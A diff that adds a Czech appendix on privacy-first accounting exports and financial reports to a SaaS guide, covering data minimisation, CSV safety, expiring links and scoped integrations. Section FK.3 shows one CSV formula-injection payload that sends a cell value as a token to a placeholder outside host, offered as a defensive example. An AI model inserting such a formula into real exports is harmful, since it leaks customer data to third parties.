@@ -25374,7 +25374,171 @@ Privacy-first billing není anti-growth. Je to growth bez dluhů, které se vrá
 
 Platby a fakturace potřebují jasné oddělení datových domén, bezpečný checkout, stavový model předplatného, idempotentní webhooky, přístupné faktury, dokumentovanou daňovou logiku, agregované revenue metriky a férový proces pro rušení, downgrade a refundy. Privacy-first SaaS nemá z plateb dělat datový vysavač — má zákazníkovi dodat jistotu, že peníze, doklady i přístup jsou pod kontrolou.
 
+
+# Příloha FK: Účetní exporty a finanční reporty bez tabulkového minového pole, datového přeposílání a CSV magie
+
+Jakmile SaaS začne vydělávat, vznikne nový typ provozního tlaku: účetní chce export, zakladatel chce rychlý přehled, support potřebuje dohledat platbu, investor se ptá na MRR a někdo v týmu navrhne „pošli mi prostě celý CSV“. Tady začíná nenápadné peklo. Ne proto, že export je špatně, ale protože export často vytrhne data z produktu, oprávnění, audit logu a bezpečnostního kontextu.
+
+Privacy-first účetní export není asketický zákaz tabulek. Je to řízený výstup: má jasný účel, omezený rozsah, bezpečný formát, konkrétního příjemce, expiraci a stopu. Produkt má umět předat finance tam, kam patří, aniž by z účetního procesu udělal tajný druhý datový sklad.
+
+## FK.1 Nejdřív rozděl exporty podle účelu
+
+Jeden univerzální export „všechno za měsíc“ je pohodlný jen do chvíle, než v něm skončí údaje, které účetní nepotřebuje, support si ho stáhne na notebook a někdo ho omylem přepošle do špatného vlákna. Ano, klasika. Digitální verze toho, když papír založíš do špatného šanonu, jen s větším dosahem.
+
+Rozliš minimálně tyto exporty:
+
+| Export | Primární účel | Typická pole | Co tam nepatří |
+| --- | --- | --- | --- |
+| Účetní doklady | zaúčtování a evidence | číslo dokladu, datum, měna, částka, DPH režim, odběratel | produktové eventy, login historie, poznámky supportu |
+| Platby a párování | kontrola uhrazení | variabilní symbol, payment ID, stav platby, datum úhrady | kompletní platební metoda, interní risk skóre |
+| Předplatné | přehled aktivních tarifů | workspace, tarif, období, stav | osobní aktivita uživatelů v aplikaci |
+| Refundy a dobropisy | kontrola oprav | původní doklad, částka, důvod kategorie | volný text ze supportu bez redakce |
+| Manažerský report | rozhodování týmu | agregované MRR, churn, nové účty, refund rate | osobní údaje jednotlivých zákazníků, pokud nejsou nutné |
+
+Praktické pravidlo: účetní export není datový dump. Je to produktová funkce pro konkrétní práci. Když neumíš říct, kdo export použije a jaké rozhodnutí nebo povinnost tím splní, export je podezřelý.
+
+## FK.2 Pole v exportu mají mít vlastníka a důvod
+
+Každý sloupec je malé rozhodnutí o soukromí. Sloupec `customer_email` může být nutný pro ruční dohledání dokladu. Sloupec `last_login_ip` v účetním exportu je skoro jistě jen datová turistika. A datová turistika má špatné boty.
+
+U každého exportu si udělej jednoduchou kartu:
+
+```text
+Export: Měsíční účetní doklady
+Příjemce: externí účetní kancelář
+Účel: zaúčtování dokladů a kontrola DPH režimu
+Frekvence: měsíčně
+Formát: CSV + PDF doklady v archivu
+Retence exportního souboru: 30 dní v aplikaci
+Vlastník: finance/admin role
+Citlivá pole: fakturační adresa, e-mail odběratele, DIČ
+Zakázaná pole: produktová aktivita, poznámky supportu, IP adresy, interní rizikové příznaky
+```
+
+Tahle karta není byrokracie. Je to brzda proti budoucí větě „přidáme tam ještě pár polí, kdyby se hodila“. V produktu se tahle věta tváří nevinně. V exportech často znamená, že se osobní údaje začnou množit mimo kontrolu.
+
+## FK.3 CSV je jednoduché, ale ne nevinné
+
+CSV je oblíbené, protože ho otevře skoro každý účetní nástroj. Zároveň je to formát, kde se dá pokazit víc věcí, než vypadá: kódování, oddělovače, desetinné čárky, časové zóny, uvozovky, nové řádky v textu a hlavně formula injection. OWASP popisuje CSV injection jako riziko, kdy tabulkové programy mohou buňky začínající znaky jako `=`, `+`, `-` nebo `@` interpretovat jako vzorce: https://owasp.org/www-community/attacks/CSV_Injection
+
+Bezpečný CSV export proto řeš takhle:
+
+- textová pole, která zadal uživatel, escapuj pro CSV i pro tabulkové programy,
+- zvaž prefixování rizikových hodnot apostrofem nebo jinou bezpečnou strategií podle cílového nástroje,
+- drž pevné pořadí sloupců a verzi exportu,
+- přidej hlavičku s názvy polí, ne tajemné sloupce `col1`, `col2`, `col3`,
+- používej UTF-8 a jasně dokumentuj oddělovač,
+- částky exportuj jako samostatné číselné pole a měnu jako samostatný sloupec,
+- datum exportuj ve stabilním formátu a s časovou zónou, pokud čas ovlivňuje výklad.
+
+Příklad špatného pole v CSV:
+
+```text
+=IMPORTXML("https://example.invalid/?token="&A1)
+```
+
+Příklad bezpečnějšího přístupu: uživatelský text se nebere jako důvěryhodná tabulková hodnota, ale jako neaktivní text. To znamená escapování, testy s tabulkovými aplikacemi a jasné pravidlo, že export nikdy nesmí umožnit spuštění vzorce z dat zákazníka.
+
+## FK.4 Exporty mají být dočasné, ne věčné přílohy v chatu
+
+Největší riziko exportu často nezačíná v aplikaci, ale po stažení. Soubor skončí v e-mailu, ve sdílené složce, v messengeru, v `Downloads` a za rok ho někdo najde při hledání fotek z dovolené. Romantika, jen s fakturačními údaji.
+
+Dobrá exportní rutina:
+
+- export se generuje na požádání oprávněnou rolí,
+- odkaz ke stažení je autentizovaný nebo krátkodobý,
+- soubor má expiraci a po ní se smaže,
+- stažení se zapisuje do audit logu,
+- velké exporty se neposílají jako příloha e-mailu,
+- příjemce dostane informaci, jak se souborem bezpečně zacházet,
+- opakované automatické exporty mají vlastníka a pravidelné review.
+
+Pokud externí účetní potřebuje data pravidelně, je lepší vytvořit řízený přístup nebo napojení s omezeným rozsahem než každý měsíc ručně přeposílat ZIP. Ruční přeposílání je procesní dluh převlečený za rychlost.
+
+## FK.5 Manažerské finance drž agregované
+
+Zakladatelé a týmy často potřebují vědět, jestli produkt roste. K tomu ale obvykle nepotřebují seznam všech zákazníků s e-mailem, historií plateb a interní poznámkou „možná odejde“. Potřebují trend, segment, důvod a další akci.
+
+Privacy-first finanční dashboard může obsahovat:
+
+- MRR/ARR po tarifech,
+- nové placené účty za období,
+- churn podle tarifu nebo segmentu,
+- refund rate,
+- počet selhaných plateb,
+- průměrnou dobu od trialu k platbě,
+- počet účtů v grace period,
+- výjimky vyžadující ruční akci.
+
+Detail jednotlivého zákazníka otevři jen tam, kde je jasný pracovní důvod: support řeší konkrétní ticket, finance párují konkrétní doklad, account manager připravuje obnovu. Dashboard pro rozhodování má preferovat agregaci. Detail má být oprávnění, ne výchozí obrazovka.
+
+## FK.6 Automatické napojení na účetnictví omez scope
+
+Integrace s účetním systémem umí ušetřit hodiny práce. Taky umí vytvořit krásný datový tunel, kterým poteče víc informací, než je potřeba. Před napojením si napiš, co přesně se synchronizuje, kterým směrem a kdo řeší chyby.
+
+Minimum pro bezpečné účetní napojení:
+
+- samostatný integrační účet nebo token,
+- scope jen pro doklady a platby, ne pro celý produkt,
+- žádné sdílené admin heslo,
+- audit log vytvoření, změny a deaktivace integrace,
+- jasné mapování polí mezi produktem a účetnictvím,
+- fronta nebo retry mechanismus pro výpadky,
+- bezpečné chybové zprávy bez osobních údajů navíc,
+- testovací režim se syntetickými daty.
+
+Když účetní systém umí jen široký přístup „všechno nebo nic“, zapiš to jako riziko. Někdy je i ruční omezený export lepší než automatizace, která z pohodlí udělá trvalý průvan v datech.
+
+## FK.7 Support nemá účetním exportem suplovat admin práva
+
+Support bude občas potřebovat pomoct zákazníkovi s platbou nebo fakturou. To ale neznamená, že má mít tlačítko „stáhnout vše“. Pro podporu vytvoř úzké akce: znovu poslat fakturu, zobrazit poslední stav platby, vyvolat obnovu checkout odkazu, předat refund ke schválení.
+
+Dobré support UI:
+
+- ukazuje jen faktury daného workspace,
+- maskuje nepotřebné identifikátory,
+- odděluje čtení od citlivých akcí,
+- vyžaduje důvod u refundu nebo ruční změny předplatného,
+- zapisuje akce do audit logu,
+- neumožňuje supportu exportovat finance všech zákazníků bez vyšší role.
+
+Pokud support potřebuje účetní data často, problém možná není v oprávnění supportu, ale v nejasném zákaznickém UI. Zákazník má umět najít fakturu, stav předplatného a cestu k opravě údajů sám. Support má zachraňovat výjimky, ne obsluhovat běžný provoz ručně.
+
+## FK.8 Checklist účetních exportů a finančních reportů
+
+Před spuštěním nebo revizí exportů si projdi:
+
+- Má každý export konkrétní účel, příjemce, vlastníka a retenční dobu?
+- Jsou účetní, platební, předplatné a manažerské reporty oddělené?
+- Obsahuje export jen pole, která příjemce opravdu potřebuje?
+- Jsou uživatelská textová pole chráněná proti CSV/formula injection?
+- Má CSV stabilní schéma, verzi, kódování, oddělovač a dokumentaci?
+- Neobsahují účetní exporty produktovou aktivitu, support poznámky nebo IP adresy bez důvodu?
+- Jsou exportní odkazy autentizované nebo krátkodobé?
+- Mažou se vygenerované soubory po rozumné době?
+- Zapisuje se generování a stažení exportu do audit logu?
+- Má externí účetní nebo integrační systém jen nezbytný rozsah přístupu?
+- Jsou finanční dashboardy agregované a detail zákazníka chráněný rolí?
+- Umí zákazník najít faktury a stav předplatného bez support ping-pongu?
+
+## Codyho komentář
+
+Účetní export je jeden z těch míst, kde se soukromí rozbije potichu. Nikdo nechce šmírovat. Jen „rychle pošleme tabulku“. Můj pohled — Cody: pokud export nejde bezpečně popsat jednou kartou, nejspíš je moc široký. A pokud se pravidelně posílá e-mailem jako příloha, produkt má díru v procesu, ne jen praktický workaround.
+
+Nejlepší finanční provoz je nudný: správná data na správném místě, žádné tajné kopie, žádné magické CSV a žádný support přístup do ekonomické reality všech zákazníků. Nuda opět vítězí. Bohužel pro chaos, bohudík pro firmu.
+
+## Zdroje k příloze
+
+- OWASP — CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
+- EDPB — Basic principles, včetně minimalizace, účelového omezení, integrity a důvěrnosti: https://www.edpb.europa.eu/topics/key-gdpr-concepts/basic-principles_en
+
+## Shrnutí přílohy
+
+Účetní exporty a finanční reporty mají být řízené výstupy, ne univerzální datové skládky. Privacy-first SaaS odděluje exporty podle účelu, omezuje sloupce na nutné minimum, chrání CSV proti formula injection, nastavuje expiraci exportních souborů, audit loguje stažení, drží manažerské reporty agregované a dává supportu úzké akce místo plošného finančního přístupu.
+
 ## Pracovní log
+
+- 2026-08-14: Přidána příloha FK o účetních exportech a finančních reportech: účel exportů, datové minimum, bezpečné CSV, expirace souborů, účetní integrace, support role, agregované finance a checklist.
 
 - 2026-08-14: Přidána příloha FJ o privacy-first platbách, fakturaci a předplatném: oddělení platebních dat, checkout, stavový model, faktury, DPH proces, revenue metriky, refundy, rušení a checklist.
 
